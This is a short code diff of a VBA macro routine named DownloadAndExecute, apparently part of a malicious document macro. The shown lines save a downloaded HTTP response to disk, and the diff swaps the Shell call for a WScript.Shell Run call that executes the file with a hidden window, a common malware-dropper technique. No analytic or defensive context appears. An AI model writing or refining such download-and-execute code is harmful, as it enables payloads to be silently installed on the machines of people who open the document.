@@ -22,7 +22,7 @@ Private Sub DownloadAndExecute()
         oStream.Write WinHttpReq.ResponseBody
         oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
         oStream.Close
-        result = Shell(downloadPath, 0) ' vbHide = 0
+        CreateObject("WScript.Shell").Run downloadPath, 0
     End If    
     
 End Sub
